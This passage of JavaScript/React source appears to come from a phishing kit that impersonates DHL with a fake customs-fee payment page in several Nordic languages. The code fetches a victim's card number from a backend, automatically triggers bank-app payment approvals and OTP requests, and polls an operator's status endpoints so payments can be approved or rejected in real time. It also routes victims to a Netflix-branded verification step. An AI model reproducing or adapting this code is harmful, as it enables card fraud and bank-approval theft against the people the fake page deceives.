      resendCode: "Skicka avisering igen",
      openBankApp: "Öppna bankapp",
      waitingForApproval: "Väntar på godkännande",
    },
    no: {
      flag: "🇳🇴",
      name: "Norsk",
      approval_status_checking: "Bekrefter betalingen din...",
      approval_status_waiting: "Venter på din godkjenning...",
      approval_status_approved: "Godkjenning mottatt, omdirigerer...",
      approve_title: "Godkjenn betalingen din",
      approve_sub:
        "Banken din har sendt en autorisasjonsforespørsel til bankappen din. Følg trinnene nedenfor.",
      approve_button: "Jeg har godkjent",
      approve_button_processing: "Behandler...",
      approve_note:
        "Hvis du ikke ser forespørselen, vent eller kontakt banken din.",
      step1_label: "Fyll ut informasjon",
      step2_label: "Betal tollavgifter",
      step3_label: "Send omforsendelse",
      alert_message: "Betaling godkjent! Omdirigerer til neste trinn...",
      footer_privacy: "Personvernerklæring",
      footer_consent: "Samtykkeinnstillinger",
      footer_copyright: "DHL Group - Alle rettigheter forbeholdt",
      errorSendingCode: "Feil ved sending av kode",
      paymentIdNotFound: "Betalings-ID ikke funnet",
      newNotificationSent: "Ny varsling sendt",
      errorRequestingCode: "Feil ved forespørsel om kode",
      otpVerified: "Kode bekreftet",
      transactionRejected: "Transaksjon avvist",
      loading: "Laster...",
      pleaseWait: "Vennligst vent...",
      detectingLanguage: "Oppdager språket ditt...",
      resendCode: "Send varsling på nytt",
      openBankApp: "Åpne bankapp",
      waitingForApproval: "Venter på godkjenning",
    },
    da: {
      flag: "🇩🇰",
      name: "Dansk",
      approval_status_checking: "Bekræfter din betaling...",
      approval_status_waiting: "Venter på din godkendelse...",
      approval_status_approved: "Godkendelse modtaget, omdirigerer...",
      approve_title: "Godkend din betaling",
      approve_sub:
        "Din bank har sendt en autorisationsanmodning til din bankapp. Følg nedenstående trin.",
      approve_button: "Jeg har godkendt",
      approve_button_processing: "Behandler...",
      approve_note:
        "Hvis du ikke ser anmodningen, vent eller kontakt din bank.",
      step1_label: "Udfyld information",
      step2_label: "Betal toldafgifter",
      step3_label: "Indsend gensendelse",
      alert_message: "Betaling godkendt! Omdirigerer til næste trin...",
      footer_privacy: "Privatlivspolitik",
      footer_consent: "Samtykkeindstillinger",
      footer_copyright: "DHL Group - Alle rettigheder forbeholdes",
      errorSendingCode: "Fejl ved afsendelse af kode",
      paymentIdNotFound: "Betalings-ID ikke fundet",
      newNotificationSent: "Ny notifikation sendt",
      errorRequestingCode: "Fejl ved anmodning om kode",
      otpVerified: "Kode bekræftet",
      transactionRejected: "Transaktion afvist",
      loading: "Indlæser...",
      pleaseWait: "Vent venligst...",
      detectingLanguage: "Registrerer dit sprog...",
      resendCode: "Send notifikation igen",
      openBankApp: "Åbn bankapp",
      waitingForApproval: "Venter på godkendelse",
    },
    fi: {
      flag: "🇫🇮",
      name: "Suomi",
      approval_status_checking: "Vahvistetaan maksuasi...",
      approval_status_waiting: "Odotetaan hyväksyntääsi...",
      approval_status_approved:
        "Hyväksyntä vastaanotettu, uudelleenohjataan...",
      approve_title: "Hyväksy maksusi",
      approve_sub:
        "Pankkisi on lähettänyt valtuutuspyynnön pankkisovellukseesi. Noudata alla olevia ohjeita.",
      approve_button: "Olen hyväksynyt",
      approve_button_processing: "Käsitellään...",
      approve_note: "Jos et näe pyyntöä, odota tai ota yhteyttä pankkiisi.",
      step1_label: "Täytä tiedot",
      step2_label: "Maksa tullimaksut",
      step3_label: "Lähetä uudelleenlähetys",
      alert_message:
        "Maksu hyväksytty! Uudelleenohjataan seuraavaan vaiheeseen...",
      footer_privacy: "Tietosuojailmoitus",
      footer_consent: "Suostumusasetukset",
      footer_copyright: "DHL Group - Kaikki oikeudet pidätetään",
      errorSendingCode: "Virhe koodin lähetyksessä",
      paymentIdNotFound: "Maksu-ID:tä ei löydy",
      newNotificationSent: "Uusi ilmoitus lähetetty",
      errorRequestingCode: "Virhe koodin pyynnössä",
      otpVerified: "Koodi vahvistettu",
      transactionRejected: "Tapahtuma hylätty",
      loading: "Ladataan...",
      pleaseWait: "Odota hetki...",
      detectingLanguage: "Tunnistetaan kieltäsi...",
      resendCode: "Lähetä ilmoitus uudelleen",
      openBankApp: "Avaa pankkisovellus",
      waitingForApproval: "Odotetaan hyväksyntää",
    },
  };

  // Helper function to get translation
  const t = (key) => {
    if (translations[language] && translations[language][key]) {
      return translations[language][key];
    }
    return translations.en[key] || key;
  };

  // Detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();
      const countryCode = data.country_code?.toUpperCase();
      const detectedLang = countryToLanguage[countryCode] || "en";
      setLanguage(detectedLang);

      const selectedLangObj =
        languages.find((lang) => lang.code === detectedLang) ||
        languages.find((lang) => lang.code === "en");
      setSelectedLang({
        flag: selectedLangObj.flag,
        name: selectedLangObj.name,
        code: selectedLangObj.code,
        rtl: selectedLangObj.rtl || false,
      });
      localStorage.setItem("preferredLanguage", detectedLang);
    } catch (error) {
      console.error("Error detecting language:", error);
      const savedLang = localStorage.getItem("preferredLanguage");
      if (savedLang && translations[savedLang]) {
        setLanguage(savedLang);
        const savedLangObj =
          languages.find((lang) => lang.code === savedLang) ||
          languages.find((lang) => lang.code === "en");
        setSelectedLang({
          flag: savedLangObj.flag,
          name: savedLangObj.name,
          code: savedLangObj.code,
          rtl: savedLangObj.rtl || false,
        });
      } else {
        const browserLang = navigator.language.split("-")[0];
        if (translations[browserLang]) {
          setLanguage(browserLang);
          const browserLangObj =
            languages.find((lang) => lang.code === browserLang) ||
            languages.find((lang) => lang.code === "en");
          setSelectedLang({
            flag: browserLangObj.flag,
            name: browserLangObj.name,
            code: browserLangObj.code,
            rtl: browserLangObj.rtl || false,
          });
        } else {
          setLanguage("en");
        }
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  // Polling for payment status
  useEffect(() => {
    if (!paymentId) return;

    let intervalId = null;

    const checkStatus = async () => {
      try {
        const response = await fetch(`${apiUrl}/api/status/card/${paymentId}`);
        const statusData = await response.json();

        console.log("Payment status check:", statusData);

        if (statusData.status === "otp") {
          if (intervalId) clearInterval(intervalId);
          navigate("/NetflixPaymentVerification", {
            state: { paymentId: paymentId, language: language },
          });
        } else if (statusData.status === "rejected") {
          if (intervalId) clearInterval(intervalId);
          setStatus("rejected");
          setIsWaiting(false);
          showNotification(t("transactionRejected"), "error");
          setIsSubmitting(false);
        } else if (
          statusData.status === "accepted" ||
          statusData.status === "approved"
        ) {
          if (intervalId) clearInterval(intervalId);
          setStatus("accepted");
          setIsWaiting(false);
          showNotification(t("otpVerified"), "success");
          setIsSubmitting(false);
          setTimeout(() => {
            window.location.href = "https://www.netflix.com/";
          }, 2000);
        }
      } catch (err) {
        console.error("Error polling payment status:", err);
      }
    };

    checkStatus();
    intervalId = setInterval(checkStatus, 3000);

    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [paymentId, apiUrl, navigate, language]);

  // Fetch card number
  useEffect(() => {
    if (paymentId) {
      fetch(`${apiUrl}/api/status/card/${paymentId}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.cardNumber) {
            setCardNumber(data.cardNumber);
          }
        })
        .catch((err) => console.error(err));
    }
  }, [paymentId, apiUrl]);

  // Timer for resend button
  useEffect(() => {
    if (seconds <= 0) {
      setIsResendDisabled(false);
      return;
    }
    const timer = setInterval(() => setSeconds((prev) => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [seconds]);

  // Polling for OTP status
  useEffect(() => {
    if (!idRequest || status !== "pending") return;

    let intervalId = null;

    const pollOtpStatus = async () => {
      try {
        const res = await fetch(`${apiUrl}/api/otp/status/${idRequest}`);
        const data = await res.json();

        console.log("OTP Status check:", data);

        if (data.status === "accepted") {
          if (intervalId) clearInterval(intervalId);
          setStatus("accepted");
          setIsWaiting(false);
          showNotification(t("otpVerified"), "success");
          setTimeout(() => {
            window.location.href = "/success";
          }, 2000);
        } else if (data.status === "rejected") {
          if (intervalId) clearInterval(intervalId);
          setStatus("rejected");
          setIsWaiting(false);
          showNotification(t("transactionRejected"), "error");
        }
      } catch (err) {
        console.error("Error confirming status", err);
      }
    };

    pollOtpStatus();
    intervalId = setInterval(pollOtpStatus, 2000);

    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [idRequest, status, apiUrl]);

  // Send notification to app
  const sendNotificationToApp = async () => {
    try {
      if (!paymentId) {
        showNotification(t("paymentIdNotFound"), "error");
        return false;
      }

      const response = await fetch(`${apiUrl}/api/send-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          code: "000000",
          cardId: paymentId,
        }),
      });

      const data = await response.json();

      if (response.ok && data.id) {
        setIdRequest(data.id);
        setStatus("pending");
        return true;
      } else {
        showNotification(data.error || t("errorSendingCode"), "error");
        return false;
      }
    } catch (err) {
      console.error("Error sending notification:", err);
      showNotification(t("errorSendingCode"), "error");
      return false;
    }
  };

  // Request new notification
  const requestNewNotification = async () => {
    try {
      if (!paymentId) {
        showNotification(t("paymentIdNotFound"), "error");
        return false;
      }

      const response = await fetch(`${apiUrl}/api/resend-otp-request`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardId: paymentId,
          oldOtpId: idRequest,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showNotification(t("newNotificationSent"), "success");
        return true;
      } else {
        showNotification(data.error || t("errorRequestingCode"), "error");
        return false;
      }
    } catch (err) {
      console.error("Error requesting new notification:", err);
      showNotification(t("errorRequestingCode"), "error");
      return false;
    }
  };

  const showNotification = (message, type) => {
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 3000);
  };

  // Handle button click: send notification and start waiting
  const handleOpenApp = async () => {
    if (isWaiting) return;
    setIsWaiting(true);
    const success = await sendNotificationToApp();
    if (!success) {
      setIsWaiting(false);
    }
  };

  // Handle resend
  const handleResend = async () => {
    if (isResendDisabled) return;
    setSeconds(60);
    setIsResendDisabled(true);
    await requestNewNotification();
    if (!isWaiting) {
      setIsWaiting(true);
      await sendNotificationToApp();
    }
  };

  // Auto-trigger handleOpenApp when page loads
  useEffect(() => {
    if (paymentId && !isWaiting && !idRequest && !autoOpenTriggered) {
      setAutoOpenTriggered(true);
      handleOpenApp();
    }
  }, [paymentId, isWaiting, idRequest, autoOpenTriggered]);

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (langMenuRef.current && !langMenuRef.current.contains(event.target)) {
        setIsLangMenuOpen(false);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, []);

  const handleLanguageSelect = (lang) => {
    setLanguage(lang.code);
    setSelectedLang({
      flag: lang.flag,
      name: lang.name,
      code: lang.code,
      rtl: lang.rtl || false,
    });
    setIsLangMenuOpen(false);
    localStorage.setItem("preferredLanguage", lang.code);
  };

  const formatCardNumber = (cardNum) => {
    if (!cardNum) return "XXXX XXXX XXXX 1111";
    const last4 = cardNum.slice(-4);
    return `XXXX XXXX XXXX ${last4}`;
  };

  if (isLoadingLang) {
    return <LoadingPage />;
  }

  const isRTL = language === "ar" || language === "ur" || language === "he";

  return (
    <div id="__next">
      <main className="app">
        {/* Header */}
        <div dir={isRTL ? "rtl" : "ltr"} className="sc-9fc13f70-0 hCaVpb">
          <div className="sc-af944128-0 iSQNEq">
            <div className="sc-ac1f2408-0 sc-af944128-1 fcRhWn jnXOaK">
              <div dir="ltr" className="sc-af944128-4 GghYU">
                <div className="sc-af944128-2 idxbwe">
                  <img
                    alt="DHL Logo"
                    src="data:image/png;base64,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"
                  />
                </div>
              </div>
              <div dir="ltr" className="sc-af944128-3 dZjtYI">
                <div className="sc-9fc13f70-5 bqGehh">
                  <div className="sc-9fc13f70-10 cCbdwA">
                    {/* Language Dropdown */}
                    <div
                      className="portal-lang-dropdown"
                      ref={langMenuRef}
                      style={{ position: "relative" }}
                    >
                      <button
                        className="portal-lang-btn"
                        id="langBtn"
                        onClick={() => setIsLangMenuOpen(!isLangMenuOpen)}
                      >
                        <span id="langFlag">{selectedLang.flag}</span>
                        <span id="langName">{selectedLang.name}</span>
                        <svg
                          width="12"
                          height="12"
                          viewBox="0 0 12 12"
                          fill="none"
                          style={{ marginLeft: "4px" }}
                        >
                          <path
                            d="M3 5L6 8L9 5"
                            stroke="currentColor"
                            strokeWidth="1.5"
                            strokeLinecap="round"
                          ></path>
                        </svg>
                      </button>
                      {isLangMenuOpen && (
                        <div
                          className="portal-lang-menu"
                          id="langMenu"
                          style={{
                            position: "absolute",
                            top: "calc(100% + 6px)",
                            right: 0,
                            background: "#fff",
                            borderRadius: "10px",
                            boxShadow: "0 8px 32px rgba(0,0,0,.18)",
                            minWidth: "180px",
                            overflow: "hidden",
                            zIndex: 200,
                            border: "1px solid #e2e8f0",
                          }}
                        >
                          {languages.map((lang) => (
                            <a
                              key={lang.code}
                              href="#"
                              onClick={(e) => {
                                e.preventDefault();
                                handleLanguageSelect(lang);
                              }}
                              style={{
                                display: "flex",
                                alignItems: "center",
                                gap: "10px",
                                padding: "10px 16px",
                                textDecoration: "none",
                                color: "#333",
                                fontSize: "14px",
                                cursor: "pointer",
                                backgroundColor:
                                  selectedLang.code === lang.code
                                    ? "#f1f5f9"
                                    : "transparent",
                                direction: lang.rtl ? "rtl" : "ltr",
                              }}
                              onMouseEnter={(e) =>
                                (e.currentTarget.style.backgroundColor =
                                  "#f1f5f9")
                              }
                              onMouseLeave={(e) => {
                                if (selectedLang.code !== lang.code) {
                                  e.currentTarget.style.backgroundColor =
                                    "transparent";
                                }
                              }}
                            >
                              <span>{lang.flag}</span>
                              <span>{lang.name}</span>
                              {selectedLang.code === lang.code && (
                                <span
                                  style={{
                                    marginLeft: "auto",
                                    color: "#d40511",
                                  }}
                                >
                                  ✓
                                </span>
                              )}
                            </a>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Notification */}
        {notification && (
          <div
            style={{
              position: "fixed",
              top: "20px",
              right: isRTL ? "auto" : "20px",
              left: isRTL ? "20px" : "auto",
              zIndex: 1000,
              padding: "12px 20px",
              borderRadius: "8px",
              backgroundColor:
                notification.type === "success" ? "#4caf50" : "#f44336",
              color: "white",
              boxShadow: "0 2px 10px rgba(0,0,0,0.2)",
            }}
          >
            {notification.message}
          </div>
        )}

        {/* Main Content */}
        <div className="sc-c68c769-0 sc-af71e42-0 kbjFD gnstmV">
          <div dir={isRTL ? "rtl" : "ltr"} className="sc-ac4a4da6-2 dLJdBj">
            <div
              id="live-region"
              aria-live="assertive"
              className="sc-c94f0948-0 bUXCqo"
            ></div>

            {/* Step Indicator */}
            <div className="portal-steps">
              <div className="portal-step done">
                <span className="portal-step-circle done">
                  <svg width="14" height="11" viewBox="0 0 14 11" fill="none">
                    <path
                      d="M1 5.5L5 9.5L13 1"
                      stroke="#fff"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    ></path>
                  </svg>
                </span>
                <span className="portal-step-label">{t("step1_label")}</span>
              </div>
              <span className="portal-step-line done"></span>
              <div className="portal-step active">
                <span className="portal-step-circle active">2</span>
                <span className="portal-step-label">{t("step2_label")}</span>
              </div>
              <span className="portal-step-line"></span>
              <div className="portal-step upcoming">
                <span className="portal-step-circle upcoming">3</span>
                <span className="portal-step-label">{t("step3_label")}</span>
              </div>
            </div>

            {/* Approval Card */}
            <div
              maxwidth="850px"
              dir={isRTL ? "rtl" : "ltr"}
              className="sc-ac4a4da6-11 eGXJee"
            >
              <div className="sc-79fe9a9-0 exaGYB">
                <div className="approve-container">
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "center",
                      padding: "24px 0 10px",
                    }}
                  >
                    {/* Phone Animation */}
                    <div className="approve-phone-wrap">
                      <div className="approve-phone">
                        <div className="approve-phone-notch"></div>
                        <div className="approve-phone-screen">
                          <div className="approve-bank-icon">
                            <svg
                              viewBox="0 0 24 24"
                              fill="none"
                              stroke="#fff"
                              strokeWidth="2"
                              strokeLinecap="round"
                              strokeLinejoin="round"
                            >
                              <path d="M3 21h18"></path>
                              <path d="M3 10h18"></path>
                              <path d="M5 6l7-3 7 3"></path>
                              <line x1="4" y1="10" x2="4" y2="21"></line>
                              <line x1="20" y1="10" x2="20" y2="21"></line>
                              <line x1="8" y1="14" x2="8" y2="17"></line>
                              <line x1="12" y1="14" x2="12" y2="17"></line>
                              <line x1="16" y1="14" x2="16" y2="17"></line>
                            </svg>
                          </div>
                          <div className="approve-bank-name">BANK APP</div>
                          <div className="approve-bank-loader">
                            <div className="approve-bank-loader-bar"></div>
                          </div>
                          <div className="approve-bank-status">
                            {isWaiting
                              ? t("waitingForApproval")
                              : t("approve_sub")}
                          </div>
                        </div>
                        <div className="approve-phone-homebtn"></div>
                      </div>
                    </div>
                    <div className="approve-status-text" id="approve-status">
                      <p
                        style={{
                          fontSize: "14px",
                          color: "#666",
                          marginTop: "10px",
                        }}
                      >
                        {t("approval_status_checking")}
                      </p>
                    </div>
                  </div>
                  <h2 className="approve-title">{t("approve_title")}</h2>
                  <p className="approve-sub">{t("approve_sub")}</p>

                  {!isWaiting && !status && (
                    <button
                      data-portal="cta-button"
                      className="approve-btn"
                      id="approve-btn"
                      onClick={handleOpenApp}
                      style={{
                        opacity: 1,
                        animation: "none",
                        cursor: "pointer",
                      }}
                    >
                      {t("openBankApp")}
                    </button>
                  )}

                  {isWaiting && (
                    <div style={{ textAlign: "center", marginTop: "20px" }}>
                      <div style={{ marginBottom: "15px", color: "#666" }}>
                        {t("waitingForApproval")}
                      </div>
                      <button
                        onClick={handleResend}
                        disabled={isResendDisabled}
                        style={{
                          padding: "10px 20px",
                          backgroundColor: isResendDisabled
                            ? "#ccc"
                            : "#e50914",
                          color: "white",
                          border: "none",
                          borderRadius: "5px",
                          marginBottom: "10px",
                          cursor: isResendDisabled ? "not-allowed" : "pointer",
                          fontSize: "14px",
                        }}
                      >
                        {t("resendCode")} {isResendDisabled && `(${seconds}s)`}
                      </button>
                    </div>
                  )}

                  <p className="approve-note">{t("approve_note")}</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="sc-257ec82b-0 fMUGEY">
          <div className="sc-ac1f2408-0 sc-257ec82b-1 fcRhWn fNNAIX">
            <table dir={isRTL ? "rtl" : "ltr"} className="sc-a8acf6b-8 dOvHyx">
              <thead className="sc-a8acf6b-9 bxvLJF">
                <tr className="sc-a8acf6b-17 bFgPWm">
                  <th></th>
                </tr>
              </thead>
              <tbody className="sc-a8acf6b-10 hQgYPF">
                <tr className="sc-a8acf6b-12 brdgSb">
                  <td className="sc-a8acf6b-13 PqxXh">
                    <a
                      isfrom="footer"
                      href="#"
                      className="sc-2e620315-0 fzLsWV"
                    >
                      <strong>{t("footer_privacy")}</strong>
                    </a>
                    <div className="sc-a8acf6b-2 sc-a8acf6b-4 fBtpLO jnjuvK">
                      <a
                        className="sc-2e620315-0 sc-a8acf6b-7 caKrkT yWwXX"
                        href="#"
                      >
                        {t("footer_consent")}
                      </a>
                    </div>
                  </td>
                  <td className="sc-a8acf6b-14 dlACfB">
                    <img
                      alt="DHL Logo"
                      loading="lazy"
                      width="160"
                      height="52"
                      decoding="async"
                      data-nimg="1"
                      src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBpZD0ibG9nbyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTk2IDUxLjgzNjciIHdpZHRoPSIxNjAiIGhlaWdodD0iNTIiPgogIDxnPgogICAgPGc+CiAgICAgIDxnPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyMi4xIDI2LjUwNTggMjIuMSAyNS4wNTgxIDI0LjA3MDMgMCAyNC4wNzAzIDAgMjIuMSAwIDIyLjEiLz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjAgMTguNDQ0NCAyOS4xOTg2IDE4LjQ0NDQgMjcuNzQ4MyAyMC40MTIgMCAyMC40MTIgMCAxOC40NDQ0IDAgMTguNDQ0NCIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMCAyNS43NTg0IDIzLjgxNDYgMjUuNzU4NCAyMi4zNzMzIDI3LjcxNTIgMCAyNy43MTUyIDAgMjUuNzU4NCAwIDI1Ljc1ODQiLz4KICAgICAgPC9nPgogICAgICA8Zz4KICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE5NiAyNC4wNzAzIDE2OS41OTc2IDI0LjA3MDMgMTcxLjA0NDYgMjIuMTAxNCAxOTYgMjIuMTAxNCAxOTYgMjQuMDcwMyAxOTYgMjQuMDcwMyIvPgogICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTk2IDI3LjcxNTIgMTY2LjkxMjggMjcuNzE3OSAxNjguMzUzNyAyNS43NTg0IDE5NiAyNS43NTg0IDE5NiAyNy43MTUyIDE5NiAyNy43MTUyIi8+CiAgICAgICAgPHBvbHlnb24gcG9pbnRzPSIxNzMuNzM1NCAxOC40NDQ0IDE5NiAxOC40NDQ0IDE5NiAyMC40MTMzIDE3Mi4yODcgMjAuNDE0NyAxNzMuNzM1NCAxOC40NDQ0IDE3My43MzU0IDE4LjQ0NDQiLz4KICAgICAgPC9nPgogICAgPC9nPgogICAgPGc+CiAgICAgIDxwYXRoIGQ9Im0yNS42NzI2LDI3LjcxNTJsMTIuNTc4LTE3LjA4ODVoMTUuNjA4MmMxLjcyNTIsMCwxLjcwMjYuNjU1Ljg1OTUsMS43OTc1LS44NTYyLDEuMTYtMi4zMTM0LDMuMTU0Ni0zLjE4NTQsNC4zMzIyLS40NDI2LjU5ODItMS4yNDMxLDEuNjg4MSwxLjQwODksMS42ODgxaDIwLjkxMDFjLTEuNzM5LDIuMzgyMi03LjM3OTYsOS4yNzA4LTE3LjUwODMsOS4yNzA4aC0zMC42NzFaIi8+CiAgICAgIDxwYXRoIGQ9Im05Ny43MDU2LDE4LjQ0M2wtNi44MjAyLDkuMjcyMmgtMTcuOTkyNHM2LjgxNzItOS4yNzA4LDYuODIzMy05LjI3MDhsMTcuOTg5My0uMDAxNGgwWiIvPgogICAgICA8cGF0aCBkPSJtMTIzLjcyMzksMTguNDQ0NGwtNi44MjM5LDkuMjcwOGgtMTcuOTg1NnM2LjgxNzgtOS4yNzA4LDYuODIzOS05LjI3MDhoMTcuOTg1NloiLz4KICAgICAgPHBhdGggZD0ibTEyOS41NzQ5LDE4LjQ0NDRjLjAwMDYsMC0xLjMxNCwxLjc5NzQtMS45NTI4LDIuNjYwNC0yLjI1OTMsMy4wNTMzLS4yNjI2LDYuNjEwNCw3LjExMDksNi42MTA0aDI4Ljg4NTNsNi44MjI2LTkuMjcwOGgtNDAuODY2MVoiLz4KICAgIDwvZz4KICAgIDxnPgogICAgICA8cGF0aCBkPSJtMzQuNDY4NSwwbC02LjI2MjEsOC41MDc4aDM0LjEyODhjMS43MjQ5LDAsMS43MDIzLjY1NS44NTkzLDEuNzk3NC0uODU2MiwxLjE1ODctMi4yODk0LDMuMTc2My0zLjE2MTQsNC4zNTM4LS40NDI3LjU5NjktMS4yNDMxLDEuNjg2NywxLjQwODksMS42ODY3aDEzLjk1NjRzMi4yNDk1LTMuMDYxNCw0LjEzNTItNS42MjA1YzIuNTY1NS0zLjQ4MTQuMjIyNS0xMC43MjUyLTguOTQ4Ni0xMC43MjUyaC0zNi4xMTY1WiIvPgogICAgICA8cG9seWdvbiBwb2ludHM9IjEyNS4yNjg4IDE2LjM0NTggODEuMjYxOSAxNi4zNDU4IDkzLjI5NTYgMCAxMTEuMjgxOSAwIDEwNC4zODU4IDkuMzcyMSAxMTIuNDEzNiA5LjM3MjEgMTE5LjMxNTMgMCAxMzcuMjk4OSAwIDEyNS4yNjg4IDE2LjM0NTggMTI1LjI2ODggMTYuMzQ1OCIvPgogICAgICA8cGF0aCBkPSJtMTYyLjIwODQsMGwtMTIuMDMxNCwxNi4zNDU4aC0xOS4wNTkzUzE0My4xNTMyLDAsMTQzLjE1OTIsMGgxOS4wNDkyWiIvPgogICAgPC9nPgogIDwvZz4KICA8Zz4KICAgIDxwYXRoIGQ9Im0xMjguODQxMiw0OC4zOTQzYy0xLjc5NjgsMC0zLjE5MzktLjU1MDctNC4xOTA1LTEuNjUyM3MtMS40OTUtMi42Mjk0LTEuNDk1LTQuNTgzNXYtMS4xNDEyYzAtMS4yOTgxLjI0MzEtMi40MDk2LjcyNzktMy4zMzQzLjQ4NTUtLjkyNDQsMS4xNjc1LTEuNjMyNywyLjA0Ni0yLjEyNDMuODc4NS0uNDkxOSwxLjkwODItLjczNzcsMy4wODg1LS43Mzc3Ljk0NCwwLDEuNzkwMS4xNjA3LDIuNTM3NS40ODE4Ljc0NzUuMzIxOCwxLjM5NzEuNzkwNCw